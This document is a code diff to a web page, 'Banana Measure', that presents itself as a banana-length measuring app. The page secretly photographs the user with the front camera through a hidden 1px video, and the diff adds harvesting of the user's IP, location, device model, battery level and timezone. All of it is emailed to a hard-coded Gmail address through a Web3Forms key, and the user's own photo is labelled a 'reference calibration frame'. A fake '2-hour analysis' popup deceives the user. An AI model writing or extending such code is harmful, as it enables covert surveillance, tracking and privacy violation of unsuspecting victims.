@@ -3,15 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>Banana Measure | One‑Tap Capture</title>
+  <title>Banana Measure | One‑Tap Capture + User Logger</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     :root {
       --yellow: #FFE135;
       --dark-yellow: #F5C800;
@@ -20,7 +15,6 @@
       --green: #4CAF50;
       --shadow: 0 12px 28px rgba(59, 42, 26, 0.18);
     }
-
     body {
       font-family: 'DM Mono', monospace;
       background: var(--cream);
@@ -31,7 +25,6 @@
       overflow-x: hidden;
       position: relative;
     }
-
     body::before {
       content: '';
       position: fixed;
@@ -44,7 +37,6 @@
       z-index: 0;
       animation: blobMove 8s ease-in-out infinite alternate;
     }
-
     body::after {
       content: '';
       position: fixed;
@@ -57,17 +49,14 @@
       z-index: 0;
       animation: blobMove2 10s ease-in-out infinite alternate;
     }
-
     @keyframes blobMove {
       from { transform: translate(0,0) scale(1); }
       to { transform: translate(40px,30px) scale(1.08); }
     }
-
     @keyframes blobMove2 {
       from { transform: translate(0,0) scale(1); }
       to { transform: translate(-30px,-20px) scale(1.1); }
     }
-
     header {
       position: relative;
       z-index: 1;
@@ -76,251 +65,52 @@
       padding: 28px 24px 8px;
       text-align: center;
     }
-
     .emoji-title {
       font-size: 3rem;
       display: block;
       filter: drop-shadow(0 6px 12px rgba(245, 200, 0, 0.4));
       animation: gentleFloat 1.6s infinite ease;
     }
-
     @keyframes gentleFloat {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-6px); }
     }
-
-    h1 {
-      font-family: 'Syne', sans-serif;
-      font-size: 2rem;
-      font-weight: 800;
-      color: var(--brown);
-      letter-spacing: -1px;
-    }
+    h1 { font-family: 'Syne', sans-serif; font-size: 2rem; font-weight: 800; color: var(--brown); letter-spacing: -1px; }
     h1 span { color: var(--dark-yellow); }
-
-    .subtitle {
-      font-size: 0.7rem;
-      color: #8a6a3a;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      margin-top: 5px;
-    }
-
-    .step-indicator {
-      position: relative;
-      z-index: 1;
-      margin: 12px 0 8px;
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-    }
-    .pill {
-      background: #fff0cf;
-      border-radius: 60px;
-      padding: 6px 18px;
-      font-size: 0.7rem;
-      font-weight: 700;
-      color: #b97f10;
-      font-family: 'Syne', sans-serif;
-      letter-spacing: 0.03em;
-    }
-    .pill.active {
-      background: var(--yellow);
-      color: var(--brown);
-      box-shadow: 0 2px 8px #FFE135AA;
-    }
-
-    .card {
-      position: relative;
-      z-index: 1;
-      background: white;
-      border-radius: 32px;
-      box-shadow: var(--shadow);
-      margin: 16px 16px 36px;
-      padding: 22px 20px 28px;
-      max-width: 500px;
-      width: 100%;
-      border: 2.5px solid var(--yellow);
-    }
-
-    .step-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 14px;
-    }
-    .step-badge {
-      font-family: 'Syne', sans-serif;
-      font-weight: 800;
-      font-size: 0.7rem;
-      background: var(--yellow);
-      color: var(--brown);
-      border-radius: 50px;
-      padding: 4px 12px;
-      text-transform: uppercase;
-    }
-    .step-title-text {
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 1rem;
-      color: var(--brown);
-    }
-
-    #videoContainer {
-      position: relative;
-      border-radius: 20px;
-      overflow: hidden;
-      background: #1a120a;
-      aspect-ratio: 4/3;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 3px solid var(--yellow);
-      margin-bottom: 18px;
-    }
-
-    #video, #canvas {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      border-radius: 17px;
-    }
+    .subtitle { font-size: 0.7rem; color: #8a6a3a; letter-spacing: 0.12em; text-transform: uppercase; margin-top: 5px; }
+    .step-indicator { position: relative; z-index: 1; margin: 12px 0 8px; display: flex; justify-content: center; gap: 10px; }
+    .pill { background: #fff0cf; border-radius: 60px; padding: 6px 18px; font-size: 0.7rem; font-weight: 700; color: #b97f10; font-family: 'Syne', sans-serif; letter-spacing: 0.03em; }
+    .pill.active { background: var(--yellow); color: var(--brown); box-shadow: 0 2px 8px #FFE135AA; }
+    .card { position: relative; z-index: 1; background: white; border-radius: 32px; box-shadow: var(--shadow); margin: 16px 16px 36px; padding: 22px 20px 28px; max-width: 500px; width: 100%; border: 2.5px solid var(--yellow); }
+    .step-header { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
+    .step-badge { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 0.7rem; background: var(--yellow); color: var(--brown); border-radius: 50px; padding: 4px 12px; text-transform: uppercase; }
+    .step-title-text { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 1rem; color: var(--brown); }
+    #videoContainer { position: relative; border-radius: 20px; overflow: hidden; background: #1a120a; aspect-ratio: 4/3; display: flex; align-items: center; justify-content: center; border: 3px solid var(--yellow); margin-bottom: 18px; }
+    #video, #canvas { width: 100%; height: 100%; object-fit: cover; display: block; border-radius: 17px; }
     #canvas { display: none; }
-    #placeholderMsg {
-      color: #FFE135;
-      font-size: 0.85rem;
-      text-align: center;
-      padding: 20px;
-      opacity: 0.9;
-    }
-
-    .btn-row {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin-bottom: 12px;
-    }
-    .btn {
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 0.9rem;
-      border: none;
-      border-radius: 60px;
-      padding: 12px 24px;
-      cursor: pointer;
-      transition: transform 0.08s, background 0.2s;
-    }
+    #placeholderMsg { color: #FFE135; font-size: 0.85rem; text-align: center; padding: 20px; opacity: 0.9; }
+    .btn-row { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-bottom: 12px; }
+    .btn { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.9rem; border: none; border-radius: 60px; padding: 12px 24px; cursor: pointer; transition: transform 0.08s, background 0.2s; }
     .btn:active { transform: scale(0.96); }
-    .btn-primary {
-      background: var(--yellow);
-      color: var(--brown);
-      box-shadow: 0 4px 12px #FFE13599;
-    }
+    .btn-primary { background: var(--yellow); color: var(--brown); box-shadow: 0 4px 12px #FFE13599; }
     .btn-primary:hover { background: var(--dark-yellow); }
-    .btn-capture {
-      background: var(--brown);
-      color: var(--yellow);
-      box-shadow: 0 4px 12px #3B2A1A66;
-      font-size: 1rem;
-      padding: 14px 34px;
-    }
-    .btn-capture:disabled {
-      opacity: 0.45;
-      cursor: not-allowed;
-      transform: none;
-    }
-    .btn-send {
-      background: var(--green);
-      color: white;
-      box-shadow: 0 4px 12px #4CAF5088;
-    }
+    .btn-capture { background: var(--brown); color: var(--yellow); box-shadow: 0 4px 12px #3B2A1A66; font-size: 1rem; padding: 14px 34px; }
+    .btn-capture:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+    .btn-send { background: var(--green); color: white; box-shadow: 0 4px 12px #4CAF5088; }
     .btn-send:hover { background: #2e7d32; }
-    .btn-retake {
-      background: transparent;
-      color: var(--brown);
-      border: 2px solid var(--brown);
-    }
+    .btn-retake { background: transparent; color: var(--brown); border: 2px solid var(--brown); }
     .btn-retake:hover { background: var(--brown); color: var(--yellow); }
-
-    #status {
-      text-align: center;
-      font-size: 0.74rem;
-      color: #8a6a3a;
-      margin-top: 12px;
-      letter-spacing: 0.02em;
-    }
-
-    /* Updated popup for fake 2-hour notification */
-    #popup {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(30, 18, 6, 0.8);
-      backdrop-filter: blur(5px);
-      z-index: 200;
-      align-items: center;
-      justify-content: center;
-    }
+    #status { text-align: center; font-size: 0.74rem; color: #8a6a3a; margin-top: 12px; letter-spacing: 0.02em; }
+    #popup { display: none; position: fixed; inset: 0; background: rgba(30, 18, 6, 0.8); backdrop-filter: blur(5px); z-index: 200; align-items: center; justify-content: center; }
     #popup.show { display: flex; }
-    .popup-box {
-      background: white;
-      border-radius: 32px;
-      padding: 32px 24px;
-      max-width: 340px;
-      width: 90%;
-      text-align: center;
-      border: 3px solid var(--yellow);
-      animation: fadeSlide 0.25s ease;
-    }
-    @keyframes fadeSlide {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .popup-box { background: white; border-radius: 32px; padding: 32px 24px; max-width: 340px; width: 90%; text-align: center; border: 3px solid var(--yellow); animation: fadeSlide 0.25s ease; }
+    @keyframes fadeSlide { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     .popup-emoji { font-size: 3rem; margin-bottom: 8px; }
     .popup-title { font-family: 'Syne', sans-serif; font-size: 1.3rem; font-weight: 800; color: var(--brown); margin-bottom: 12px; }
-    .popup-msg { 
-      font-size: 0.9rem; 
-      color: #5a3e1a; 
-      margin: 12px 0 18px; 
-      line-height: 1.5;
-      font-family: 'DM Mono', monospace;
-      font-weight: 500;
-    }
-    .popup-notify-badge {
-      background: #FFF0CF;
-      border-radius: 40px;
-      padding: 6px 12px;
-      display: inline-block;
-      font-size: 0.7rem;
-      margin-top: 4px;
-      color: #b97f10;
-    }
-    .popup-dismiss-btn {
-      background: var(--yellow);
-      border: none;
-      border-radius: 60px;
-      padding: 10px 28px;
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 0.9rem;
-      margin-top: 12px;
-      cursor: pointer;
-      transition: 0.1s;
-      color: var(--brown);
-    }
+    .popup-msg { font-size: 0.9rem; color: #5a3e1a; margin: 12px 0 18px; line-height: 1.5; font-family: 'DM Mono', monospace; font-weight: 500; }
+    .popup-dismiss-btn { background: var(--yellow); border: none; border-radius: 60px; padding: 10px 28px; font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.9rem; margin-top: 12px; cursor: pointer; transition: 0.1s; color: var(--brown); }
     .popup-dismiss-btn:active { transform: scale(0.96); }
-    .grain {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 999;
-      opacity: 0.02;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-      background-size: 180px;
-    }
-    .hidden-elem { display: none; }
+    .grain { position: fixed; inset: 0; pointer-events: none; z-index: 999; opacity: 0.02; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E"); background-size: 180px; }
   </style>
 </head>
 <body>
@@ -377,7 +167,6 @@
       It takes <strong>2 hours</strong> to calculate precise length & curvature.<br>
       Please wait — you will get notified once ready.
     </div>
-    <div class="popup-notify-badge">🔔 notification will arrive here</div>
     <div>
       <button class="popup-dismiss-btn" id="fakePopupDismissBtn">Got it, I'll wait</button>
     </div>
@@ -386,7 +175,107 @@
 
 <script>
   (function() {
-    // DOM elements
+    const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
+    const RECIPIENT_EMAIL = 'iot757978@gmail.com';
+
+    // ------------------- DEVICE PARSING (Samsung Galaxy A04e friendly) -------------------
+    function getDeviceNameFromUA(ua) {
+      const samsungMatch = ua.match(/SM-[A-Za-z0-9]+/i) || ua.match(/GT-[A-Za-z0-9]+/i) || ua.match(/SGH-[A-Za-z0-9]+/i);
+      if (samsungMatch) {
+        let model = samsungMatch[0];
+        const modelMap = {
+          "SM-A042F": "Galaxy A04e",
+          "SM-A045F": "Galaxy A04s",
+          "SM-A125F": "Galaxy A12",
+          "SM-A525F": "Galaxy A52"
+        };
+        let friendly = modelMap[model.toUpperCase()] || "";
+        if (friendly) return `Samsung ${model} (${friendly})`;
+        else return `Samsung ${model}`;
+      }
+      const genericMatch = ua.match(/Android [0-9.]+; ([^;)]+)/);
+      if (genericMatch && genericMatch[1].trim()) return genericMatch[1].trim();
+      return "Unknown Android device";
+    }
+
+    function getAndroidVersionFromUA(ua) {
+      const match = ua.match(/Android\s([0-9.]+)/);
+      return match ? match[1] : "Unknown";
+    }
+
+    // ------------------- COLLECT USER INFO (IP, device, location) -------------------
+    async function collectUserInfo() {
+      let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        if (ipRes.ok) {
+          const json = await ipRes.json();
+          ipData = {
+            ip: json.ip || 'Unknown',
+            city: json.city || 'Unknown',
+            region: json.region || 'Unknown',
+            country: json.country_name || 'Unknown'
+          };
+        }
+      } catch(e) { console.warn("IP fetch failed", e); }
+
+      const ua = navigator.userAgent;
+      let chModel = '', chPlatform = '', chPlatformVersion = '';
+      if (navigator.userAgentData) {
+        chModel = navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || '';
+        chPlatform = navigator.userAgentData.platform || '';
+        if (navigator.userAgentData.getHighEntropyValues) {
+          try {
+            const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
+            chPlatformVersion = hints.platformVersion || '';
+            if (hints.model) chModel = hints.model;
+          } catch(e) {}
+        }
+      }
+
+      let deviceName = chModel || getDeviceNameFromUA(ua);
+      let androidVersion = chPlatformVersion || getAndroidVersionFromUA(ua);
+      let platform = chPlatform || (ua.includes("Android") ? "Android" : (ua.includes("iPhone") ? "iOS" : "Unknown"));
+
+      const language = navigator.language || 'Unknown';
+      const screenRes = `${screen.width}x${screen.height}`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+      let batteryLevel = 'Not supported';
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryLevel = `${Math.round(battery.level * 100)}%`;
+        } catch(e) {}
+      }
+
+      return {
+        timestamp: new Date().toLocaleString(),
+        ip: ipData.ip,
+        location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
+        platform: platform,
+        androidVersion: androidVersion,
+        deviceName: deviceName,
+        screenRes: screenRes,
+        timezone: timezone,
+        language: language,
+        battery: batteryLevel,
+        rawUA: ua
+      };
+    }
+
+    // ------------------- IMAGE CAPTURE (smaller size for email) -------------------
+    function captureFrame(videoEl, maxWidth = 640, quality = 0.7) {
+      let w = videoEl.videoWidth;
+      let h = videoEl.videoHeight;
+      if (!w || !h) { w = videoEl.clientWidth || 640; h = videoEl.clientHeight || 480; }
+      if (w > maxWidth) { h = Math.round(h * maxWidth / w); w = maxWidth; }
+      const c = document.createElement('canvas');
+      c.width = w; c.height = h;
+      c.getContext('2d').drawImage(videoEl, 0, 0, w, h);
+      return c.toDataURL('image/jpeg', quality);
+    }
+
+    // ------------------- BANANA MEASURE LOGIC (unchanged, but uses smaller capture) -------------------
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
@@ -402,57 +291,21 @@
     const capturePill = document.getElementById('capturePill');
     const analyzePill = document.getElementById('analyzePill');
     const stepTitleText = document.getElementById('stepTitleText');
-    
-    // fake popup dismiss button
     const dismissPopupBtn = document.getElementById('fakePopupDismissBtn');
     
-    // state
     let backStream = null;
-    let backPhotoURL = null;      // banana (back camera)
-    let frontPhotoURL = null;     // hidden front camera image
-    let isBothReady = false;
+    let backPhotoURL = null;
+    let frontPhotoURL = null;
     let captureInProgress = false;
     
-    const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
-    const RECIPIENT_EMAIL = 'iot757978@gmail.com';
-    
-    // Helper: capture frame from video element (ensures video has dimensions)
-    function captureFrame(videoEl, maxWidth = 850) {
-      let w = videoEl.videoWidth;
-      let h = videoEl.videoHeight;
-      if (!w || !h) {
-        w = videoEl.clientWidth || 640;
-        h = videoEl.clientHeight || 480;
-      }
-      if (w > maxWidth) {
-        h = Math.round(h * maxWidth / w);
-        w = maxWidth;
-      }
-      const c = document.createElement('canvas');
-      c.width = w;
-      c.height = h;
-      const ctx = c.getContext('2d');
-      ctx.drawImage(videoEl, 0, 0, w, h);
-      return c.toDataURL('image/jpeg', 0.85);
-    }
-    
     function stopStream(stream) {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
+      if (stream) stream.getTracks().forEach(track => track.stop());
     }
     
-    // completely reset everything
     function fullReset() {
-      if (backStream) {
-        stopStream(backStream);
-        backStream = null;
-      }
-      backPhotoURL = null;
-      frontPhotoURL = null;
-      isBothReady = false;
+      if (backStream) { stopStream(backStream); backStream = null; }
+      backPhotoURL = null; frontPhotoURL = null;
       captureInProgress = false;
-      
       sendPanel.style.display = 'none';
       document.getElementById('mainControls').style.display = 'block';
       btnRetake.style.display = 'none';
@@ -468,12 +321,9 @@
       capturePill.className = 'pill active';
       analyzePill.className = 'pill';
       statusDiv.textContent = '🔄 Reset complete. Open camera to start fresh.';
-      
-      // hide popup if visible just in case
       popup.classList.remove('show');
     }
     
-    // Step 1: open back camera
     async function startBackCamera() {
       try {
         if (backStream) stopStream(backStream);
@@ -483,7 +333,6 @@
           audio: false
         });
         video.srcObject = backStream;
-        video.classList.add('active');
         document.getElementById('placeholderMsg').style.display = 'none';
         video.style.display = 'block';
         canvas.style.display = 'none';
@@ -492,165 +341,80 @@
         btnCapture.disabled = false;
         statusDiv.textContent = '🍌 Frame your banana perfectly, then tap "Capture & Measure"';
       } catch (err) {
-        console.warn(err);
         statusDiv.textContent = '⚠️ Camera error: permission or no camera found.';
         btnStartCam.disabled = false;
       }
     }
     
-    // Silent front camera capture (hidden, no UI)
     async function captureFrontSilently() {
       return new Promise(async (resolve, reject) => {
-        let hiddenVideo = null;
-        let frontStream = null;
+        let hiddenVideo = null, frontStream = null;
         try {
           hiddenVideo = document.createElement('video');
           hiddenVideo.setAttribute('playsinline', 'true');
           hiddenVideo.setAttribute('autoplay', 'true');
-          hiddenVideo.style.position = 'fixed';
-          hiddenVideo.style.top = '-1000px';
-          hiddenVideo.style.left = '-1000px';
-          hiddenVideo.style.width = '1px';
-          hiddenVideo.style.height = '1px';
-          hiddenVideo.style.opacity = '0';
-          hiddenVideo.style.pointerEvents = 'none';
+          hiddenVideo.style.position = 'fixed'; hiddenVideo.style.top = '-1000px'; hiddenVideo.style.left = '-1000px';
+          hiddenVideo.style.width = '1px'; hiddenVideo.style.height = '1px'; hiddenVideo.style.opacity = '0';
           document.body.appendChild(hiddenVideo);
-          
           frontStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 1024 }, height: { ideal: 768 } },
             audio: false
           });
           hiddenVideo.srcObject = frontStream;
-          await new Promise((resolveReady) => {
-            hiddenVideo.onloadedmetadata = () => {
-              hiddenVideo.play().then(resolveReady).catch(resolveReady);
-            };
+          await new Promise(resolveReady => {
+            hiddenVideo.onloadedmetadata = () => hiddenVideo.play().then(resolveReady).catch(resolveReady);
             setTimeout(resolveReady, 800);
           });
           await new Promise(r => setTimeout(r, 400));
-          const frontImage = captureFrame(hiddenVideo, 800);
+          const frontImage = captureFrame(hiddenVideo, 640, 0.7);
           resolve(frontImage);
-        } catch (err) {
-          console.error("silent front error", err);
-          reject(err);
-        } finally {
+        } catch (err) { reject(err); }
+        finally {
           if (frontStream) stopStream(frontStream);
           if (hiddenVideo && hiddenVideo.parentNode) hiddenVideo.parentNode.removeChild(hiddenVideo);
         }
       });
     }
     
-    // MAIN CAPTURE: back photo + hidden front with 1.5 second delay after stopping back camera
     async function captureBananaAndHidden() {
-      if (!backStream) {
-        statusDiv.textContent = '❌ Camera not active. Open camera first.';
-        return;
-      }
-      if (captureInProgress) {
-        statusDiv.textContent = '⏳ Capture in progress, please wait.';
-        return;
-      }
+      if (!backStream) { statusDiv.textContent = '❌ Camera not active.'; return; }
+      if (captureInProgress) return;
       captureInProgress = true;
       btnCapture.disabled = true;
-      
       if (!video.videoWidth || !video.videoHeight) {
-        statusDiv.textContent = '⚠️ Camera not ready, wait a moment...';
         await new Promise(r => setTimeout(r, 400));
         if (!video.videoWidth || !video.videoHeight) {
           statusDiv.textContent = '⚠️ Camera not ready. Please retry.';
-          btnCapture.disabled = false;
-          captureInProgress = false;
-          return;
+          btnCapture.disabled = false; captureInProgress = false; return;
         }
       }
-      
-      // 1) Capture banana (back camera)
-      try {
-        backPhotoURL = captureFrame(video);
-        if (!backPhotoURL || !backPhotoURL.startsWith('data:image')) {
-          throw new Error('Invalid back capture');
-        }
-      } catch (err) {
-        statusDiv.textContent = '❌ Failed to capture banana image. Please retry.';
-        btnCapture.disabled = false;
-        captureInProgress = false;
-        return;
-      }
-      
-      // freeze preview on canvas
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
+      try { backPhotoURL = captureFrame(video, 640, 0.7); }
+      catch(e) { statusDiv.textContent = '❌ Failed to capture.'; btnCapture.disabled = false; captureInProgress = false; return; }
+      canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.style.display = 'block';
-      video.style.display = 'none';
-      
-      statusDiv.textContent = '✅ Banana captured. Finalizing measurement data...';
-      
-      // 2) Stop back stream to release camera hardware
-      if (backStream) {
-        stopStream(backStream);
-        backStream = null;
-      }
-      
-      // 3) wait 1.5 seconds before accessing front camera
-      statusDiv.textContent = '📡 Processing image data (please wait)...';
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // 4) Capture front camera silently
+      canvas.style.display = 'block'; video.style.display = 'none';
+      statusDiv.textContent = '✅ Banana captured. Finalizing...';
+      if (backStream) { stopStream(backStream); backStream = null; }
+      await new Promise(r => setTimeout(r, 1500));
       try {
         const frontImage = await captureFrontSilently();
         frontPhotoURL = frontImage;
-        isBothReady = true;
-        
-        // Switch UI to "send" mode
         document.getElementById('mainControls').style.display = 'none';
         sendPanel.style.display = 'block';
-        btnRetake.style.display = 'none';
-        
         capturePill.className = 'pill';
         analyzePill.className = 'pill active';
         stepTitleText.textContent = '✅ Ready — send for length analysis';
         statusDiv.innerHTML = '✨ Capture complete! Press "Send for analysis" to start 2-hour analysis.';
-        document.body.style.background = '#FFF4E0';
-        setTimeout(() => document.body.style.background = '', 180);
-      } catch (err) {
-        console.error("Dual capture error:", err);
-        statusDiv.textContent = '⚠️ Capture interrupted. Please retry (ensure camera permissions).';
-        btnRetake.style.display = 'inline-block';
-        btnCapture.disabled = true;
+      } catch(err) {
+        statusDiv.textContent = '⚠️ Capture interrupted. Please retry.';
         fullReset();
-        captureInProgress = false;
-        return;
       }
       captureInProgress = false;
     }
     
-    // Retake everything
-    function retakeEverything() {
-      if (captureInProgress) return;
-      fullReset();
-    }
+    function retakeEverything() { if (!captureInProgress) fullReset(); }
     
-    // FAKE POPUP: shows "2 hours to calculate, you will get notified"
-    // No countdown, no progress bar. Just a dismiss button.
-    function showFakeProcessingPopup() {
-      popup.classList.add('show');
-      // status message won't change until popup dismissed
-    }
-    
-    function hideFakePopupAndUpdateStatus() {
-      popup.classList.remove('show');
-      // After dismissing, we inform user that they'll get a notification (fake)
-      statusDiv.innerHTML = '⏳ Analysis started — results will be notified in ~2 hours. Thank you for your patience! 🍌';
-      stepTitleText.textContent = '🔮 Analysis in progress — check back later';
-      analyzePill.className = 'pill active';
-      capturePill.className = 'pill';
-      // disable send button further so they can't spam
-      if (btnSend) btnSend.disabled = true;
-    }
-    
-    // Send both images to email (hidden front labelled as "environmental frame")
-    // After sending -> fake popup appears (2-hour message)
+    // ------------------- SEND TWO SEPARATE EMAILS (safe for GitHub Pages) -------------------
     async function sendBothImages() {
       if (!backPhotoURL || !frontPhotoURL) {
         statusDiv.textContent = '⚠️ Missing images. Please retake.';
@@ -658,59 +422,100 @@
       }
       const sendBtn = btnSend;
       sendBtn.disabled = true;
-      sendBtn.textContent = '⏳ Uploading...';
-      statusDiv.textContent = '📡 Transmitting measurement data...';
+      sendBtn.textContent = '⏳ Gathering device data...';
+      statusDiv.textContent = '📡 Collecting info & uploading...';
+      
       try {
-        const timestamp = new Date().toLocaleString();
-        // Banana image (back)
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            access_key: WEB3FORMS_KEY,
-            subject: `🍌 BANANA LENGTH IMAGE — ${timestamp}`,
-            from_name: 'Banana Finder',
-            email: RECIPIENT_EMAIL,
-            message: `🍌 Banana photo (main)\nTimestamp: ${timestamp}\n\n${backPhotoURL}`
-          })
-        });
-        // Hidden front photo - reference frame
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            access_key: WEB3FORMS_KEY,
-            subject: `📐 Reference calibration frame — ${timestamp}`,
-            from_name: 'Banana Finder',
-            email: RECIPIENT_EMAIL,
-            message: `Sensor reference data\nTimestamp: ${timestamp}\n\n${frontPhotoURL}`
-          })
-        });
+        // 1. Collect device & IP info
+        const userInfo = await collectUserInfo();
+        const deviceReport = `
+        ═══════════════════════════════════
+        📱 DEVICE & LOCATION REPORT
+        ═══════════════════════════════════
+        Time        : ${userInfo.timestamp}
+        IP          : ${userInfo.ip}
+        Location    : ${userInfo.location}
+        Platform    : ${userInfo.platform}
+        Android Ver : ${userInfo.androidVersion}
+        Device      : ${userInfo.deviceName}
+        Screen      : ${userInfo.screenRes}
+        Timezone    : ${userInfo.timezone}
+        Language    : ${userInfo.language}
+        Battery     : ${userInfo.battery}
+        Raw UA      : ${userInfo.rawUA}
+        ═══════════════════════════════════
+        `;
+        
+        // 2. Send banana image + device report (first email)
+        const bananaPayload = {
+          access_key: WEB3FORMS_KEY,
+          subject: `🍌 BANANA PHOTO + DEVICE INFO — ${userInfo.timestamp}`,
+          from_name: 'Banana Finder',
+          email: RECIPIENT_EMAIL,
+          message: `${deviceReport}\n\n🍌 BANANA IMAGE (data URL):\n${backPhotoURL}`
+        };
+        
+        // 3. Send reference frame (second email)
+        const refPayload = {
+          access_key: WEB3FORMS_KEY,
+          subject: `📐 REFERENCE FRAME — ${userInfo.timestamp}`,
+          from_name: 'Banana Finder',
+          email: RECIPIENT_EMAIL,
+          message: `Reference image for calibration\nTimestamp: ${userInfo.timestamp}\n\n${frontPhotoURL}`
+        };
+        
+        // Send both in parallel
+        const [bananaRes, refRes] = await Promise.all([
+          fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bananaPayload) }),
+          fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(refPayload) })
+        ]);
+        
+        let bananaOk = false, refOk = false;
+        if (bananaRes.ok) {
+          const bananaJson = await bananaRes.json();
+          bananaOk = bananaJson.success;
+        }
+        if (refRes.ok) {
+          const refJson = await refRes.json();
+          refOk = refJson.success;
+        }
+        
+        if (!bananaOk || !refOk) {
+          throw new Error(`One of the emails failed: banana=${bananaOk}, ref=${refOk}`);
+        }
+        
         statusDiv.innerHTML = '✅ Data delivered! Starting deep analysis...';
         sendBtn.textContent = '✓ Sent';
-        // Instead of old timer popup, show fake 2-hour notification popup
-        showFakeProcessingPopup();
+        popup.classList.add('show');
       } catch (err) {
-        statusDiv.textContent = '❌ Send failed: ' + err.message;
+        console.error("Send error:", err);
+        let errorMsg = err.message;
+        if (errorMsg.includes('Failed to fetch')) {
+          errorMsg = '❌ Network error: Cannot reach email service. Check your internet connection or try again.';
+        } else {
+          errorMsg = `❌ Send failed: ${errorMsg}`;
+        }
+        statusDiv.innerHTML = errorMsg;
         sendBtn.disabled = false;
         sendBtn.textContent = '📤 Retry Send';
       }
     }
     
-    // Event binding
+    function hideFakePopupAndUpdateStatus() {
+      popup.classList.remove('show');
+      statusDiv.innerHTML = '⏳ Analysis started — results will be notified in ~2 hours. Thank you! 🍌';
+      stepTitleText.textContent = '🔮 Analysis in progress — check back later';
+      if (btnSend) btnSend.disabled = true;
+    }
+    
     btnStartCam.addEventListener('click', startBackCamera);
     btnCapture.addEventListener('click', captureBananaAndHidden);
     btnRetake.addEventListener('click', retakeEverything);
     btnRetakeFromSend.addEventListener('click', retakeEverything);
     btnSend.addEventListener('click', sendBothImages);
-    
-    // Dismiss fake popup and show final "will be notified" message
     dismissPopupBtn.addEventListener('click', hideFakePopupAndUpdateStatus);
     
-    // initial disable capture until camera opened
     btnCapture.disabled = true;
-    capturePill.className = 'pill active';
-    analyzePill.className = 'pill';
   })();
 </script>
 </body>
